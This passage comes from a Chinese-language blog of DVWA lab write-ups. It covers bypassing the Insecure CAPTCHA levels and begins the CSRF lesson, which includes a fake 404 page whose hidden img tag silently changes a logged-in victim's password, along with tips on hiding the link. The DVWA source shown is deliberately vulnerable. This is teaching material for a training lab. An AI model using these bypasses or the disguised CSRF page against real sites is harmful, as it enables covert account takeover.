class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysql_close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二步就直接将修改值更新到数据库中了</p><p>那么我们抓包直接把 step 改成 2，是不是就可以绕过验证了呢</p><p><img src="../img/Insecure-CAPTCHA/5.png" alt="Insecure-CAPTCHA"></p><p>因此，CSRF 漏洞在这里仍可以无脑利用，创建个钓鱼网站欺骗受害者点击，神不知鬼不觉中修改用户密码</p><br><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><blockquote><p>源码</p></blockquote><p>步骤一加了个 passed_captcha 隐藏域，步骤二里加了一个判断</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vulnerabilities/captcha/source/medium.php</span></span><br><span class="line"><span class="comment">// step 1 部分代码</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;</span></span><br><span class="line"><span class="string">&lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt;</span></span><br><span class="line"><span class="string">&lt;form action=\&quot;#\&quot; method=\&quot;POST\&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=\&quot;hidden\&quot; name=\&quot;step\&quot; value=\&quot;2\&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;input type=\&quot;hidden\&quot; name=\&quot;password_new\&quot; value=\&quot;<span class="subst">&#123;$pass_new&#125;</span>\&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;input type=\&quot;hidden\&quot; name=\&quot;password_conf\&quot; value=\&quot;<span class="subst">&#123;$pass_conf&#125;</span>\&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;input type=\&quot;hidden\&quot; name=\&quot;passed_captcha\&quot; value=\&quot;true\&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;input type=\&quot;submit\&quot; name=\&quot;Change\&quot; value=\&quot;Change\&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// step 2 部分代码</span></span><br><span class="line"><span class="keyword">if</span>( !<span class="variable">$_POST</span>[ <span class="string">&#x27;passed_captcha&#x27;</span> ] ) &#123;</span><br><span class="line"><span class="variable">$html</span>     .= <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;You have not passed the CAPTCHA.&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以说是没有什么改进，同样抓包加个 passed_captcha 参数，就可以修改密码了，CSRF 稳吃</p><p><img src="../img/Insecure-CAPTCHA/6.png" alt="Insecure-CAPTCHA"></p><br><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><blockquote><p>源码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vulnerabilities/captcha/source/high.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line"><span class="variable">$hide_form</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$pass_new</span>  = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line"><span class="variable">$pass_conf</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check CAPTCHA from 3rd party</span></span><br><span class="line"><span class="variable">$resp</span> = recaptcha_check_answer( <span class="variable">$_DVWA</span>[ <span class="string">&#x27;recaptcha_private_key&#x27;</span> ],</span><br><span class="line"><span class="variable">$_SERVER</span>[ <span class="string">&#x27;REMOTE_ADDR&#x27;</span> ],</span><br><span class="line"><span class="variable">$_POST</span>[ <span class="string">&#x27;recaptcha_challenge_field&#x27;</span> ],</span><br><span class="line"><span class="variable">$_POST</span>[ <span class="string">&#x27;recaptcha_response_field&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Did the CAPTCHA fail?</span></span><br><span class="line"><span class="keyword">if</span>( !<span class="variable">$resp</span>-&gt;is_valid &amp;&amp; ( <span class="variable">$_POST</span>[ <span class="string">&#x27;recaptcha_response_field&#x27;</span> ] != <span class="string">&#x27;hidd3n_valu3&#x27;</span> || <span class="variable">$_SERVER</span>[ <span class="string">&#x27;HTTP_USER_AGENT&#x27;</span> ] != <span class="string">&#x27;reCAPTCHA&#x27;</span> ) ) &#123;</span><br><span class="line"><span class="comment">// What happens when the CAPTCHA was entered incorrectly</span></span><br><span class="line"><span class="variable">$html</span>     .= <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// CAPTCHA was correct. Do both new passwords match?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line"><span class="variable">$pass_new</span> = mysql_real_escape_string( <span class="variable">$pass_new</span> );</span><br><span class="line"><span class="variable">$pass_new</span> = md5( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Update database</span></span><br><span class="line"><span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27; LIMIT 1;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysql_query( <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Feedback for user</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Ops. Password mismatch</span></span><br><span class="line"><span class="variable">$html</span>     .= <span class="string">&quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>现在不分步了，合在一起处理，来看关键判断代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( !<span class="variable">$resp</span>-&gt;is_valid &amp;&amp; ( <span class="variable">$_POST</span>[ <span class="string">&#x27;recaptcha_response_field&#x27;</span> ] != <span class="string">&#x27;hidd3n_valu3&#x27;</span> || <span class="variable">$_SERVER</span>[ <span class="string">&#x27;HTTP_USER_AGENT&#x27;</span> ] != <span class="string">&#x27;reCAPTCHA&#x27;</span> ) )</span><br></pre></td></tr></table></figure><p>若人机验证返回结果为失败（!$resp-&gt;is_valid）且 recaptcha_response_field 或请求头中的 User-Agent 其中一个参数不为其应为的值，即为验证失败，直接 return</p><p>这里有逻辑漏洞，如果我们让 $_POST[ ‘recaptcha_response_field’ ] = ‘hidd3n_valu3’ 且 $_SERVER[ ‘HTTP_USER_AGENT’ ] = ‘reCAPTCHA’，这条判断句就不成立了</p><p><img src="../img/Insecure-CAPTCHA/7.png" alt="Insecure-CAPTCHA"></p><p>正确的逻辑应该是这样的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( !<span class="variable">$resp</span>-&gt;is_valid &amp;&amp; <span class="variable">$_POST</span>[ <span class="string">&#x27;recaptcha_response_field&#x27;</span> ] != <span class="string">&#x27;hidd3n_valu3&#x27;</span> &amp;&amp; <span class="variable">$_SERVER</span>[ <span class="string">&#x27;HTTP_USER_AGENT&#x27;</span> ] != <span class="string">&#x27;reCAPTCHA&#x27;</span> )</span><br></pre></td></tr></table></figure><p>或者说这样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( !( <span class="variable">$resp</span>-&gt;is_valid &amp;&amp; <span class="variable">$_POST</span>[ <span class="string">&#x27;recaptcha_response_field&#x27;</span> ] == <span class="string">&#x27;hidd3n_valu3&#x27;</span> &amp;&amp; <span class="variable">$_SERVER</span>[ <span class="string">&#x27;HTTP_USER_AGENT&#x27;</span> ] == <span class="string">&#x27;reCAPTCHA&#x27;</span> ) )</span><br></pre></td></tr></table></figure><br><p>PS. 有一个可以吐槽的地方，最后调用 generateSessionToken 生成 token，前面又没有 checkToken，生成来干嘛……估计是用 Impossible 的代码来改没删干净？</p><br><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><blockquote><p>源码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vulnerabilities/captcha/source/impossible.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line"><span class="variable">$hide_form</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$pass_new</span>  = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line"><span class="variable">$pass_new</span>  = stripslashes( <span class="variable">$pass_new</span> );</span><br><span class="line"><span class="variable">$pass_new</span>  = mysql_real_escape_string( <span class="variable">$pass_new</span> );</span><br><span class="line"><span class="variable">$pass_new</span>  = md5( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line"><span class="variable">$pass_conf</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"><span class="variable">$pass_conf</span> = stripslashes( <span class="variable">$pass_conf</span> );</span><br><span class="line"><span class="variable">$pass_conf</span> = mysql_real_escape_string( <span class="variable">$pass_conf</span> );</span><br><span class="line"><span class="variable">$pass_conf</span> = md5( <span class="variable">$pass_conf</span> );</span><br><span class="line"></span><br><span class="line"><span class="variable">$pass_curr</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_current&#x27;</span> ];</span><br><span class="line"><span class="variable">$pass_curr</span> = stripslashes( <span class="variable">$pass_curr</span> );</span><br><span class="line"><span class="variable">$pass_curr</span> = mysql_real_escape_string( <span class="variable">$pass_curr</span> );</span><br><span class="line"><span class="variable">$pass_curr</span> = md5( <span class="variable">$pass_curr</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check CAPTCHA from 3rd party</span></span><br><span class="line"><span class="variable">$resp</span> = recaptcha_check_answer( <span class="variable">$_DVWA</span>[ <span class="string">&#x27;recaptcha_private_key&#x27;</span> ],</span><br><span class="line"><span class="variable">$_SERVER</span>[ <span class="string">&#x27;REMOTE_ADDR&#x27;</span> ],</span><br><span class="line"><span class="variable">$_POST</span>[ <span class="string">&#x27;recaptcha_challenge_field&#x27;</span> ],</span><br><span class="line"><span class="variable">$_POST</span>[ <span class="string">&#x27;recaptcha_response_field&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Did the CAPTCHA fail?</span></span><br><span class="line"><span class="keyword">if</span>( !<span class="variable">$resp</span>-&gt;is_valid ) &#123;</span><br><span class="line"><span class="comment">// What happens when the CAPTCHA was entered incorrectly</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Check that the current password is correct</span></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27;</span> );</span><br><span class="line"><span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line"><span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:password&#x27;</span>, <span class="variable">$pass_curr</span>, PDO::PARAM_STR );</span><br><span class="line"><span class="variable">$data</span>-&gt;execute();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Do both new password match and was the current password correct?</span></span><br><span class="line"><span class="keyword">if</span>( ( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span>) &amp;&amp; ( <span class="variable">$data</span>-&gt;rowCount() == <span class="number">1</span> ) ) &#123;</span><br><span class="line"><span class="comment">// Update the database</span></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;UPDATE users SET password = (:password) WHERE user = (:user);&#x27;</span> );</span><br><span class="line"><span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:password&#x27;</span>, <span class="variable">$pass_new</span>, PDO::PARAM_STR );</span><br><span class="line"><span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line"><span class="variable">$data</span>-&gt;execute();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Feedback for the end user - success!</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Feedback for the end user - failed!</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Either your current password is incorrect or the new passwords did not match.&lt;br /&gt;Please try again.&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>相比之前有几大改进</p><ul><li>改密码时需要输入当前密码</li><li>判断条件只有 $resp-&gt;is_valid</li><li>使用 PDO 技术防止 SQL 注入</li><li>加入 token 机制</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> DVWA </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF</title>
      <link href="/2020/02/28/CSRF/"/>
      <url>/2020/02/28/CSRF/</url>
      
        <content type="html"><![CDATA[<h2 id="CSRF-简介"><a href="#CSRF-简介" class="headerlink" title="CSRF 简介"></a>CSRF 简介</h2><p>CSRF，全称Cross-site request forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密码等）</p><p>CSRF 与 XSS 最大的区别就在于，CSRF 并没有盗取 cookie 而是直接利用  </p><br><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><blockquote><p>分析</p></blockquote><p>给了一个改密码的窗口，在新密码和确认新密码的框中都输入 123 并提交，可以看到页面是通过 GET 传参的，并且显示密码修改成功</p><p><img src="../img/CSRF/1.png" alt="CSRF"></p><p>如果攻击者就构造这样的一个 url 恶意链接，诱使用户在存有该网页 cookie 等身份验证信息的<strong>浏览器</strong>中点击，那么受害者的密码就会在其不知情的情况下被修改</p><blockquote><p>源码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vulnerabilities/csrf/source/low.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line"><span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Do the passwords match?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line"><span class="comment">// They do!</span></span><br><span class="line"><span class="variable">$pass_new</span> = mysql_real_escape_string( <span class="variable">$pass_new</span> );</span><br><span class="line"><span class="variable">$pass_new</span> = md5( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Update the database</span></span><br><span class="line"><span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysql_query( <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Feedback for the user</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Issue with passwords matching</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// dvwa/includes/dvwaPage.inc.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dvwaCurrentUser</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="variable">$dvwaSession</span> =&amp; dvwaSessionGrab();<span class="comment">// 返回用户 SESSION 数组</span></span><br><span class="line"><span class="keyword">return</span> ( <span class="keyword">isset</span>( <span class="variable">$dvwaSession</span>[ <span class="string">&#x27;username&#x27;</span> ]) ? <span class="variable">$dvwaSession</span>[ <span class="string">&#x27;username&#x27;</span> ] : <span class="string">&#x27;&#x27;</span>) ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务器只是简单地判断传过来的两个参数相不相等，相等就调用 dvwaCurrentUser 找到当前用户名的记录进行修改</p><p>不过真的有人会点这么明显的恶意 url 吗？我们不妨对其进行伪装</p><blockquote><p>短网址</p></blockquote><p>使用百度提供的短网址服务将网址缩短，因为 DVWA 是搭建在虚拟机中的，使用的是 ip 访问，所以无法使用该服务，只有公网域名 url 才可以被缩短</p><p><img src="../img/CSRF/2.png" alt="CSRF"></p><p>不过在实际攻击环境中，存在 CSRF 漏洞的公网网站一般都有域名，这倒不用担心</p><blockquote><p>使用伪装页面</p></blockquote><p>可以在自己的公网服务器上构建一个网页，并将恶意 url 隐藏在某些标签里，使用户访问或点击自己的网站时，造成恶意 url 的访问</p><p>我在另一个 kali 虚拟机中构造了如下网页，伪装成 404，恶意 url 藏在 img 标签中，网页加载图片时就会访问</p><p>其实在用户用同一个浏览器访问这个网页时，另一个网站中的用户密码就会被修改，受害者还以为仅仅是访问到了一个不存在的页面</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>404 Not Found<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Not Found<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>The requested URL was not found on this server.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">address</span>&gt;</span>Apache/2.4.41 (Debian) Server<span class="tag">&lt;/<span class="name">address</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.249.129/dvwa/vulnerabilities/csrf/?password_new=456&amp;password_conf=456&amp;Change=Change#&quot;</span> <span class="attr">border</span>=<span class="string">&quot;0&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>kali 的 ip 为 192.168.249.128，这时 DVWA 中的登录密码已被修改为 456</p><p><img src="../img/CSRF/3.png" alt="CSRF"></p><p>返回登录界面用默认密码 password 登录，失败</p><p><img src="../img/CSRF/4.png" alt="CSRF"></p><br><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><blockquote><p>源码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vulnerabilities/csrf/source/medium.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Checks to see where the request came from</span></span><br><span class="line"><span class="keyword">if</span>( eregi( <span class="variable">$_SERVER</span>[ <span class="string">&#x27;SERVER_NAME&#x27;</span> ], <span class="variable">$_SERVER</span>[ <span class="string">&#x27;HTTP_REFERER&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line"><span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Do the passwords match?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line"><span class="comment">// They do!</span></span><br><span class="line"><span class="variable">$pass_new</span> = mysql_real_escape_string( <span class="variable">$pass_new</span> );</span><br><span class="line"><span class="variable">$pass_new</span> = md5( <span 